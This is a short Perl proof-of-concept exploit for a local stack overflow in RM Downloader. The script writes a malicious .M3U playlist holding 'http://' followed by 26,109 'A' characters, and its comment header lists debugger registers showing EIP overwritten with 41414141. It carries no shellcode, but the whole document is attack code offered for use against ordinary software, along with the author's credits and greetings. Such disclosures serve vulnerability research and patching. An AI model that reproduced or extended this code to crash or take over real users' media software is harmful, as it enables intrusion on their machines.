#!/usr/bin/perl
#
#
# *********************************************************
# *  RM Downloader (.M3U File) Local Stack Overflow POC   *
# *********************************************************
#
# Found By : Cyber-Zone (ABDELKHALEK)
# E-mail   : Paradis_des_fous@hotmail.fr
# Home     : WwW.IQ-TY.CoM ; WwW.No-Exploit.CoM
# Greetz   : Hussin X , Jiko (my brother), ZoRLu , Nabilx , Mag!c ompo , Stack ... all mgharba HaCkers and Sec-r1z.com
#
# Download product : http://www.rm-to-mp3.net/downloads/RMDownloader.exe
#
#
# Olly registers
#EAX 00000001
#ECX 7C92056D ntdll.7C92056D
#EDX 00A20000
#EBX 00104A54
#ESP 000FFE3C
#EBP 00333E98 ASCII "C:\Documents and Settings\Administrateur\Bureau\KHAL.m3u"
#ESI 77C2FCE0 MSVCRT.77C2FCE0
#EDI 0000660D
#EIP 41414141
#
my $Header = "#EXTM3U\n";

my $ex="http://"."A" x 26109;# just Poc tested under MS windows SP2 Fr

open(MYFILE,'>>KHAL.m3u');

print MYFILE $Header.$ex;

close(MYFILE);
